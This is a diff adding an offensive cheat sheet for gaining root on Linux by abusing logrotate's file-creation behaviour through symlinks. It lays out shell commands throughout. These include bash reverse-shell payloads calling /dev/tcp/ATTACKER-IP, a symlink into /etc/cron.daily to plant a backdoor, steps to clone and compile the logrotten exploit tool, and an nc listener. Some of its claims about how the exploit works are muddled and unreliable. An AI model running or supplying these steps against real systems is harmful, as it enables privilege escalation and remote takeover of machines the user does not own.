@@ -1,0 +1,73 @@
+🧨 Logrotate Exploit – Quick Summary
+Goal: Exploit logrotate to gain root privileges by leveraging its file creation behavior.
+==========================================================================================================================
+📌 Prerequisites:
+  You have write access to a log file managed by logrotate (e.g., /var/log/myapp.log).
+  The log file is rotated using the create option (e.g., create 644 root root).
+  logrotate runs as root (usually via cron).
+  You can write a malicious payload into the log file.
+
+==========================================================================================================================
+🔁 Exploitation Steps (without logrotten):
+Confirm logrotate config:
+
+Check /etc/logrotate.d/myapp or similar:
+      cat /etc/logrotate.d/myapp
+
+Ensure it contains:
+      create 644 root root
+
+Write your payload to the log:
+      echo 'bash -i >& /dev/tcp/attacker-ip/port 0>&1' >> /var/log/myapp.log
+
+(Optional) Force rotation if you don’t want to wait:
+
+      sudo logrotate -f /etc/logrotate.conf
+
+Symlink the log file to a cron path:
+      rm /var/log/myapp.log
+      ln -s /etc/cron.daily/backdoor /var/log/myapp.log
+
+Wait for logrotate to run (or force it again):
+
+It will:
+Move your payload to /etc/cron.daily/backdoor.1
+Create a new root-owned /etc/cron.daily/backdoor (empty)
+Next day, cron executes /etc/cron.daily/backdoor.1
+
+🎯 Your payload runs as root → Reverse shell or privilege escalation!
+
+💡 Key Idea:
+logrotate creates a new root-owned file at the log path. If that path is a symlink, it will write to any location you choose — giving you root-level file creation!
+
+==========================================================================================================================
+ Exploitation Steps (with logrotten):
+
+Check logrotate config:
+      grep create /etc/logrotate.conf
+
+Write a reverse shell payload:
+      echo 'bash -i >& /dev/tcp/ATTACKER-IP/PORT 0>&1' > payload
+
+Clone and compile logrotten:
+      git clone https://github.com/whotwagner/logrotten.git
+      cd logrotten
+      gcc logrotten.c -o logrotten
+
+Set up your listener:
+      nc -nlvp PORT
+
+Run logrotten to symlink the log to a root-writable location:
+
+    ./logrotten -p ./payload /var/log/myapp.log
+
+Wait for logrotate to trigger (automatically via cron or manually by root):
+      sudo logrotate -f /etc/logrotate.conf
+
+Catch the reverse shell on your listener — now as root! 🎉
+
+🧠 What Happens Behind the Scenes:
+logrotten replaces /var/log/myapp.log with a symlink to a root-executable location (like /etc/cron.daily/backdoor)
+logrotate (running as root) creates a new file with create 644 root root
+Your payload gets written there
+Cron or another mechanism executes the file — with root privileges
